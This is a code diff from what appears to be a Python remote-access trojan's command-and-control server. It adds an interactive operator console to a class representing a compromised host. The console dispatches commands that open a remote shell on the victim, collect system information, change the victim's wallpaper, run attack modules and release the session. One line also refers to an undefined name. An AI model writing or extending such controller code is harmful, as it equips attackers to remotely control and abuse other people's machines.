@@ -5,7 +5,7 @@ from lib.helper import *
 from lib.debug import Debug
 
 class Dmos:
-    def __init__(self, basic, sysinfo, global_addr, conn):
+    def __init__(self, basic, sysinfo, global_addr, conn, c2):
         # basic
         self.GLOBAL         = global_addr
         self.LOCAL          = basic["local_addr"]
@@ -20,7 +20,38 @@ class Dmos:
         self.born           = colored(ctime(), 'yellow')
         self.conn           = conn
         self.interactive    = False
-        #self.multi_handler  = None
+        self.c2             = c2
+
+
+    @safe_exec
+    def interact(self):
+        conn = self.conn
+        modules_multi = self.c2.modules_multi
+        while 1:
+            command = input(colored("[{}@{}]>> ".format(self.USERNAME, self.GLOBAL), 'cyan', attrs=['bold']))
+            cmd = command.split(' ')[0]
+            args = command[len(cmd)+1:]
+
+            if cmd in modules_multi.keys():
+                modules_multi[cmd]._exec(self, args)
+            elif command == "free":
+                dmos.free_dmos()
+                terminate(conn, self.c2.multi_handler.dmoss, self, "gracefully")
+                break
+            elif command == "shell":
+                self.interactive_shell()
+            elif command == "sysinfo":
+                self.system_info()
+            elif command == "fat":
+                self.send(command.encode())
+            elif command[:9] == "bgchange ":
+                a, path = command.split(' ')
+                self.background_changer(path)
+            elif command == "clear":
+                os.system("clear")
+            elif command == "b":
+                self.c2.multi_handler.cmdline()
+                pass
 
     def free_dmos(self):
         self.conn.send("free".encode())
